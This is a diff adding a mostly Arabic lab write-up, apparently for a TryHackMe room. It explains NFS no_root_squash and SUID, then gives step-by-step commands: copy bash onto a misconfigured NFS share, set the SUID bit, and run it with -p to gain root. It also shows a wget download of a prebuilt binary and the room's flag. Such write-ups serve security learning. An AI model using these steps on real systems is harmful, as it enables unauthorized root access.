@@ -259,6 +259,188 @@ ssh -i id_rsa cappucino@10.10.58.68
 ---
 <details>
   <summary>exploiting</summary>
+
+
+
+# 🚀 NFS Privilege Escalation via Root Squash Misconfiguration
+
+## 🧠 ما هو Root Squash؟
+
+`root_squash` هو إعداد في NFS يمنع المستخدمين اللي يدخلوا من أجهزة خارجية من استخدام صلاحيات root.
+
+- ✅ إذا كان **مُفعل**: أي اتصال من مستخدم root → يتحول تلقائيًا إلى مستخدم `nfsnobody`
+- ❌ إذا كان **غير مُفعل** (misconfigured): يسمح للمستخدم يرفع ملفات ويعطيها صلاحيات root، وده خطر جدًا!
+
+---
+
+## 🔐 ما هو SUID؟
+
+**SUID (Set User ID)**: لما يكون ملف تنفيذي عليه SUID، أي حد يشغله بيشتغل بنفس صلاحيات صاحب الملف (مثل root).
+
+### مثال:
+```bash
+chmod +s bash
+ls -l bash
+# -rwsr-xr-x 1 root root 1183448 Jun  5 13:15 bash
+```
+
+هنا `s` معناها SUID مفعّل.
+
+---
+
+## 🧨 الهجوم خطوة بخطوة:
+
+### ✅ الخطوة 1: نزل ملف bash من جهاز الضحية
+
+لو عندك key لل SSH:
+```bash
+scp -i id_rsa username@10.10.58.68:/bin/bash ~/Downloads/bash
+```
+
+أو تقدر تحمله من الإنترنت (إذا مشيت معاك):
+```bash
+wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+chmod +x bash
+```
+
+---
+
+### ✅ الخطوة 2: ارفع bash إلى الـ NFS Share
+
+افترض إنك عملت mount للـ NFS في `/mnt/nfs`:
+```bash
+cp bash /mnt/nfs/bash
+```
+
+---
+
+### ✅ الخطوة 3: عيّن صلاحيات SUID
+
+```bash
+chmod +s /mnt/nfs/bash
+ls -l /mnt/nfs/bash
+# -rwsr-xr-x 1 root root ... bash
+```
+
+---
+
+### ✅ الخطوة 4: اتصل بالجهاز عبر SSH
+
+```bash
+ssh -i id_rsa username@10.10.58.68
+```
+
+---
+
+### ✅ الخطوة 5: شغّل الباش اللي عليه SUID بصلاحيات root
+
+```bash
+/mnt/nfs/bash -p
+```
+
+💥 وهتلاحظ إنك بقيت root:
+
+```bash
+whoami
+# root
+```
+
+---
+
+## 🔁 الخلاصة: مسار التصعيد الكامل
+
+```text
+NFS Access
+    ↓
+Low Privilege Shell
+    ↓
+Upload Bash Executable to the NFS Share
+    ↓
+Set SUID Bit via NFS
+    ↓
+Login via SSH
+    ↓
+Execute Bash with -p
+    ↓
+🎯 Root Access Achieved
+```
+
+---
+
+## 📌 ملاحظات مهمة:
+
+- تأكد من أن المجلد في NFS mounted عندك.
+- تأكد من صلاحيات الـ share (إنه بيقبل SUID).
+- استخدم `bash -p` دايمًا لتشغيل shell بـ privileges.
+
+
+
+
+
+----
+
+```
+cat /etc/exports
+```
+
+![image](https://github.com/user-attachments/assets/c57c6be9-b09b-4569-97ed-7fb7e7db9e1e)
+
+found ``/home           *(rw,no_root_squash)``
+
+
+----
+
+```
+scp -i id_rsa username@10.10.58.68:/bin/bash ~/Downloads/bash
+```
+
+```
+sudo cp ~/Downloads/bash /tmp/mount/bash
+```
+
+```
+sudo chmod +s /tmp/mount/bash
+```
+
+![image](https://github.com/user-attachments/assets/41d82a35-4ba7-4415-9cff-118f76b08141)
+
+
+```
+ssh -i id_rsa cappucino@10.10.58.68
+```
+
+now run ``bash`` file :
+
+
+![image](https://github.com/user-attachments/assets/ff131676-ca3a-4bd1-9584-cdfb7b2ff56d)
+
+
+```
+THM{nfs_got_pwned}
+```
+
+# الخلاصه 
+
+1. إحنا ركّبنا مجلد من السيرفر عن طريق الـ NFS.
+2. في السيرفر ده، إعداد الـ NFS مش مفعل root_squash.
+3. يعني لو أنا من جهازي رفعت ملف لمجلد الـ NFS وملّكته للـ root → السيرفر هيحترم ده!
+4. فإحنا:
+5. نسخنا نسخة من bash
+6. حطيناها في /tmp/mount/bash
+7. وفعّلنا عليها SUID
+8. لما نرجع نسجل دخول عادي على السيرفر:
+9. ونجرب نشغّل /tmp/mount/bash -p
+10. هيشتغل كأننا root!
+
+
+
+
+
+
+
+
+
+  
 </details>
 
 
